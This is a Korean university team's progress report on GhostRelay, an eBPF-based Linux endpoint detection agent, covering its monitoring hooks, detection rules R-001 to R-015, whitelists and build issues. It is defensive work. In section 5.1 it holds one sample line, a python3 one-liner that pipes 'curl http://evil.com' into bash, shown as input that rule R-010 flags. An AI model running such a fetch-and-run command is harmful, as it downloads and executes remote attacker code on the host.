---
project_name: "GhostRelay"
quad_name: "4조"
members:
  - "20233051_박도현"
  - "20253311_강수빈"
  - "20261717_이정훈"
  - "20241947_장수연"
report_number: 2
date: "2026-05-19"
status: "진행 중"
cl_level: "CL1"
contributions:
  - name: "20233051_박도현"
    role: "에이전트 개발 (시스템) / 팀장"
    tasks: "eBPF 기반 프로세스·파일·네트워크 모니터링 구현, 탐지 룰 엔진(R-001~R-009), execve argv 캡처 및 R-010, ProcTree 기반 R-011/R-012, 화이트리스트 체계, 에이전트 안정화, R-013~R-015 고급 탐지, Ubuntu 22.04 빌드 호환성 수정"
    percentage: 100
---

# [제 2차 프로젝트 진행 보고서] GhostRelay

- **팀원:** (팀장) 20233051_박도현, (팀원) 20253311_강수빈, 20261717_이정훈, 20241947_장수연
- **활동 기간:** 2026. 05. 07. ~ 2026. 05. 19. (약 2주)

---

## 팀 전체 진행 현황

- **이번 회차 목표:** 1차 보고서에서 분석하던 CVE-2025-55423 PoC 재현 및 패치 backport에서 방향을 전환하여, 리눅스 엔드포인트에서 실시간으로 보안 이벤트를 수집·분석하는 eBPF 기반 EDR 에이전트를 처음부터 설계·구현하였다.
- **현재 진행률:** 약 55% (전체 일정 대비)
- **주요 달성 사항:**
  - eBPF CO-RE 기반 프로세스·파일·네트워크 3종 모니터링 구현 완료
  - 탐지 룰 엔진 R-001~R-015 구현 및 NDJSON 출력 포맷 확정
  - execve argv 캡처, ProcTree 기반 부모-자식 관계 탐지
  - 4종 화이트리스트 도입으로 FP 비율 대폭 감소
  - 에이전트 안정화 (프로세스 종료 훅, dedup, graceful shutdown)
  - LD_PRELOAD·ptrace·setuid 고급 탐지 룰 추가
  - Ubuntu 22.04 + clang-14 빌드 호환성 수정 (vmlinux.h 사전 생성 포함)

| 구분 | 목표 | 완료 |
|------|------|------|
| 탐지 룰 | R-001~R-028 | R-001~R-015 |
| BPF 프로그램 | 6개 | 4개 |
| 운영 안정화 | dedup·shutdown·통계 | 완료 |
| 빌드 호환성 | Ubuntu 22.04 지원 | 완료 |

---

## 개인별 기여 내역

| 팀원 | 역할 | 수행 작업 | 산출물 링크 | 기여도 |
|------|------|----------|------------|--------|
| 20233051_박도현 | 에이전트 개발 / 팀장 | 아래 상세 참조 | [GitHub](https://github.com/no-carve-only-pizza/edr-agent) | 100% |
| 20253311_강수빈 | - | - | - | - |
| 20261717_이정훈 | - | - | - | - |
| 20241947_장수연 | - | - | - | - |

---

## 이번 회차 상세 구현 내용

### 1. 프로젝트 방향 전환 배경

1차 보고서에서 CVE-2025-55423(ipTIME N2V UPnP Command Injection)의 PoC 흐름을 코드 레벨까지 분석하였다. 패치 backport를 진행하려 했으나, 팀 내 역할 분담과 이후 마일스톤 목표를 재검토한 결과 **리눅스 엔드포인트 탐지·대응** 쪽이 팀 전체 방향과 더 부합한다는 판단 하에 eBPF 기반 EDR 에이전트 개발로 전환하였다.

---

### 2. 핵심 기술 선정: eBPF

리눅스에서 시스템 이벤트를 실시간으로 수집하는 방법 세 가지를 비교하였다.

| 기술 | 이벤트 범위 | 오버헤드 | 커널 경로 |
|------|------------|----------|----------|
| **eBPF** | 프로세스·파일·네트워크 전체 | 극소 | 트레이스포인트 → ringbuf → mmap |
| Auditd | 대부분의 syscall | 중간~높음 | audit 프레임워크 → netlink → 데몬 |
| inotify | 파일시스템만 | 낮음 | VFS 레이어 훅 |

eBPF를 선택한 이유:

1. **단일 프레임워크로 세 이벤트 유형 커버** — 프로세스·파일·네트워크를 동일한 방식으로 처리
2. **커널 verifier 안전성 보장** — 모든 코드 경로 종료, 스택 512바이트 제한, 미초기화 접근 없음을 정적 검증
3. **Zero-copy 링버퍼** — `BPF_MAP_TYPE_RINGBUF`로 커널→유저 복사 없이 이벤트 전달

---

### 3. 시스템 아키텍처

```
┌──────────────────────────────────────────────────────────────────┐
│                         커널 공간                                │
│                                                                  │
│  sched_process_exec   sys_enter_openat    sys_enter_connect     │
│  sys_enter_execve     sys_enter_unlinkat  sys_enter_bind        │
│  sched_process_exit   sys_enter_renameat2                        │
│                                                                  │
│       BPF 프로그램 (JIT 컴파일, verifier 검증 완료)              │
│                              │                                   │
│                    BPF Ring Buffer (mmap)                        │
└──────────────────────────────┬───────────────────────────────────┘
                               │ zero-copy
┌──────────────────────────────▼───────────────────────────────────┐
│                       유저스페이스                                │
│                                                                  │
│   ring_buffer__poll()   ──▶   match_rules()   ──▶  출력         │
│   (epoll 기반 통합 폴링)        탐지 룰 엔진        ├─ stdout    │
│                                ProcTree 참조        ├─ NDJSON   │
│                                dedup 필터           └─ HTTP POST │
└──────────────────────────────────────────────────────────────────┘
```

---

### 4. 1주차: eBPF 모니터링 3종 + 탐지 룰 엔진 (R-001~R-009)

#### 4.1 프로세스 실행 모니터링

**BPF 훅:** `tp/sched/sched_process_exec`

`execve()` 시스템 콜이 새 바이너리를 VAS에 성공적으로 매핑한 직후 발화한다. 실패한 execve는 트레이스포인트를 발화하지 않아 false-positive가 없다.

수집 정보: PID, PPID, UID, 타임스탬프, comm, 실행 파일 경로

**핵심 구현 포인트**

- `bpf_get_current_pid_tgid()` 상위 32비트가 TGID(유저스페이스 PID), 하위 32비트가 TID
- 실행 파일 경로는 `__data_loc_filename` 필드의 인코딩(`[31:16]=길이, [15:0]=오프셋`)을 `bpf_probe_read_kernel_str()`로 복사
- 부모 PID는 `BPF_CORE_READ(task, real_parent, tgid)`로 획득 (CO-RE 오프셋 자동 보정)

#### 4.2 파일시스템 변경 모니터링

| 훅 | 감지 이벤트 |
|----|-----------|
| `tp/syscalls/sys_enter_openat` | 파일 쓰기/생성 (`O_WRONLY`, `O_CREAT`, `O_TRUNC` 필터) |
| `tp/syscalls/sys_enter_unlinkat` | 파일/디렉터리 삭제 |
| `tp/syscalls/sys_enter_renameat2` | 파일 이름 변경/이동 |

**핵심 포인트:** `sys_enter_openat`의 경로 포인터는 유저스페이스 포인터이므로 `bpf_probe_read_user_str()` 사용. `RENAME_EXCHANGE` 플래그(원자적 교체)도 감지하여 원본/대상 경로 모두 수집.

#### 4.3 네트워크 연결 모니터링

| 훅 | 감지 이벤트 |
|----|-----------|
| `tp/syscalls/sys_enter_connect` | 아웃바운드 연결 시도 |
| `tp/syscalls/sys_enter_bind` | 서버 소켓 바인드 |

**핵심 포인트:** `sys_enter_connect`는 연결 성공 이전에 발화해 PID를 정확히 획득. `sockaddr_in`/`sockaddr_in6`은 uapi 타입이라 직접 정의 후 `sa_family` 2바이트를 먼저 읽어 AF 판별.

#### 4.4 탐지 룰 엔진 (R-001~R-009)

| ID | 이름 | 대상 이벤트 | 심각도 |
|----|------|-----------|--------|
| R-001 | 시스템 경로 파일 수정 | FILE_WRITE | high |
| R-002 | 로그 파일 삭제 | FILE_DELETE | high |
| R-003 | `/tmp` 경로 실행 (드로퍼) | PROC_EXEC | high |
| R-004 | 리버스셸/스캔 도구 실행 | PROC_EXEC | critical |
| R-005 | 스크립트 인터프리터 실행 | PROC_EXEC | medium |
| R-006 | 비표준 포트 아웃바운드 | NET_CONNECT | medium |
| R-007 | 서버 포트 바인드 | NET_BIND | low |
| R-008 | root 권한 인터프리터 실행 | PROC_EXEC | critical |
| R-009 | `/tmp` → 시스템 경로 rename | FILE_RENAME | critical |

JSON 직렬화는 외부 라이브러리 없이 RFC 8259 §7 규칙을 직접 구현하였다.

---

### 5. 2주차: 탐지 품질 고도화 및 에이전트 안정화

#### 5.1 execve argv 캡처 및 R-010 (인터프리터 인라인 페이로드)

`sched_process_exec` 훅만으로는 실행 인자(argv)를 얻을 수 없어 파일리스 공격 탐지에 한계가 있었다.

```
sys_enter_execve                    sched_process_exec
     │                                      │
     │  argv[] 유저 포인터 읽기             │  (exec 성공, 원본 argv 소멸)
     │──── argv_store[pid] 저장 ───────────▶│
     │     (BPF_MAP_TYPE_HASH)              │── 조회·복사 → process_event.argv
     │                                      │── 맵 삭제 → ringbuf submit
```

R-010은 인터프리터(`python3`, `perl`, `node` 등)가 `-c`/`-e` 플래그로 실행될 때 발화한다.

```
[EXEC] python3 -c "import os; os.system('curl http://evil.com|bash')"
  >>> [ALERT] R-010 | 인터프리터 인라인 페이로드 (-c/-e 플래그) [high]
```

#### 5.2 프로세스 트리 캐시 및 R-011/R-012 (웹셸·SQLi RCE)

exec 이벤트의 `ppid`만으로는 부모 `comm`을 알 수 없어 웹셸/DB RCE 탐지가 불가능했다.

**ProcTree 클래스** (`src/proc_tree.cpp`):
- `update(pid, ppid, comm)`: 실행 이벤트마다 맵에 등록
- `comm_of(ppid)`: 부모 comm 조회 (업데이트 전에 먼저 수행 — PID 재사용 오염 방지)
- `init_from_proc()`: 에이전트 시작 전 실행 중인 nginx, mysqld 등을 `/proc/<pid>/status` 스캔으로 부트스트랩 (약 220~280개 항목)

| 룰 | 탐지 조건 | 심각도 |
|----|----------|--------|
| R-011 | 웹 서버(nginx, apache 등) → 셸/인터프리터 실행 | critical |
| R-012 | DB 서버(mysqld, postgres 등) → 셸/인터프리터 실행 | critical |

#### 5.3 화이트리스트 체계 구축

1주차 구현에서 FP 비율이 높은 룰을 분석하고 4종 화이트리스트를 도입하였다.

| 화이트리스트 | 적용 룰 | 예시 |
|-------------|---------|------|
| `BIND_WHITELIST` | R-007 | sshd, nginx, dockerd, containerd-shi |
| `SYS_WRITE_WHITELIST` | R-001 | apt, dpkg, rpm |
| `OUTBOUND_WHITELIST` | R-006 | curl, wget, git |
| `PKG_MANAGER_COMMS` | R-005/R-008 부모 억제 | pip, npm, make, cmake |

> `task_struct.comm`은 최대 15자(+NUL)로 제한된다. 화이트리스트에는 잘린 이름을 사용해야 한다 (`NetworkManager` → `NetworkManage`, `dpkg-preconfigure` → `dpkg-preconfig`).

#### 5.4 에이전트 안정화

**프로세스 종료 훅** (`sched_process_exit`): ProcTree에서 종료된 PID를 즉시 제거하여 PID 재사용 오탐 방지. TGID==TID 조건으로 스레드 종료는 필터링.

**알림 중복 억제 (dedup)**: 동일 `(pid, rule_id)` 조합의 알림을 3초 윈도우 내 1회만 출력.

**graceful shutdown**: `SIGINT`/`SIGTERM` 수신 시 링버퍼를 모두 드레인한 후 종료. 종료 시 룰별 발화 횟수 요약 출력.

#### 5.5 R-013~R-015 고급 탐지 룰

| 룰 | 탐지 조건 | 구현 포인트 |
|----|----------|------------|
| R-013 | LD_PRELOAD 환경변수 인젝션 | `sys_enter_execve`에서 `envp` 순회, `MAX_ENV_ENTRIES=16` 회 `#pragma unroll` |
| R-014 | ptrace ATTACH 시도 | `ptrace_event` 전용 BPF 훅 + 링버퍼 |
| R-015 | 알려지지 않은 setuid 바이너리 실행 | `uid ≠ euid` 조건, `SETUID_WHITELIST`로 sudo/ping 등 제외 |

#### 5.6 탐지 룰 전체 목록 (2주차 기준)

| ID | 이름 | 이벤트 | 심각도 | 추가 |
|----|------|--------|--------|------|
| R-001 | 시스템 경로 파일 수정 | FILE_WRITE | high | 1주차 |
| R-002 | 로그 파일 삭제 | FILE_DELETE | high | 1주차 |
| R-003 | `/tmp` 경로 실행 (드로퍼) | PROC_EXEC | high | 1주차 |
| R-004 | 리버스셸/스캔 도구 실행 | PROC_EXEC | critical | 1주차 |
| R-005 | 스크립트 인터프리터 실행 | PROC_EXEC | medium | 1주차 |
| R-006 | 비표준 포트 아웃바운드 | NET_CONNECT | medium | 1주차 |
| R-007 | 서버 포트 바인드 | NET_BIND | low | 1주차 |
| R-008 | root 권한 인터프리터 실행 | PROC_EXEC | critical | 1주차 |
| R-009 | `/tmp` → 시스템 경로 rename | FILE_RENAME | critical | 1주차 |
| R-010 | 인터프리터 `-c`/`-e` 인라인 페이로드 | PROC_EXEC | high | **2주차** |
| R-011 | 웹 서버 자식 셸 실행 (웹셸) | PROC_EXEC | critical | **2주차** |
| R-012 | DB 서버 자식 셸 실행 (SQLi RCE) | PROC_EXEC | critical | **2주차** |
| R-013 | LD_PRELOAD 환경변수 인젝션 | PROC_EXEC | high | **2주차** |
| R-014 | ptrace ATTACH 시도 | PTRACE | high | **2주차** |
| R-015 | 알려지지 않은 setuid 바이너리 실행 | PROC_EXEC | high | **2주차** |

---

## 이슈 및 해결 방안

| 이슈 | 해결 방법 |
|------|----------|
| BPF 검증기 복잡도 초과 (E2BIG) — `dns_monitor.bpf.c`의 QNAME 파싱에서 중첩 `#pragma unroll`(10×63=630회)이 명령어 복잡도 한계 초과 | 중첩 루프를 `label_left`/`need_dot` 상태 변수를 가진 단일 bounded 루프(115회)로 재설계. 커널 5.3+에서 bounded loop를 verifier가 직접 지원함을 확인하여 적용 |
| Ubuntu 22.04 + clang-14 빌드 실패 (`Relocations in generic ELF (EM: 247)`) | clang-14 생성 DWARF 섹션을 libbpf v1.4가 파싱 실패 → `llvm-strip --strip-debug`로 DWARF 제거 후 스켈레톤 생성. BTF(`.BTF`/`.BTF.ext`)는 이름 기반 필터로 보존 |
| Ubuntu 22.04에서 구버전 bpftool이 선택됨 (cmake `find_program` HINTS/PATHS 순서 오류) | HINTS에 커널 버전 전용 경로(`/usr/lib/linux-tools/${KVER}`) 우선 지정 |
| Ubuntu 22.04에서 `clang` 바이너리 없음 (clang-14로 설치) | `find_program(CLANG NAMES clang clang-18 ... clang-14 ...)` 순서 탐색 |
| bpftool이 상위 커널 BTF를 파싱 못하는 경우 | `include/vmlinux.h` 사전 생성 후 커밋. 빌드 시 bpftool 없이 복사하여 사용 |

---

## 다음 회차 목표

| 항목 | 내용 |
|------|------|
| R-016~R-018 구현 | memfd_create 파일리스 실행, RWX 메모리, DNS 터널링 탐지 |
| 상관 분석 엔진 | R-019~R-023: ptrace+memfd, /tmp 실행+아웃바운드 등 이벤트 체인 탐지 |
| 위협 인텔리전스 | Feodo Tracker IP 블록리스트, URLhaus 도메인 피드 연동 (R-025~R-026) |
| 대시보드 연동 | 백엔드 API 포맷 협의 및 NDJSON 스키마 확정 |

---

## 참고 자료

- libbpf-bootstrap: https://github.com/libbpf/libbpf-bootstrap
- Linux BPF verifier documentation: https://docs.kernel.org/bpf/verifier.html
- MITRE ATT&CK Linux techniques: https://attack.mitre.org/matrices/enterprise/linux/
- 소스코드: https://github.com/no-carve-only-pizza/edr-agent
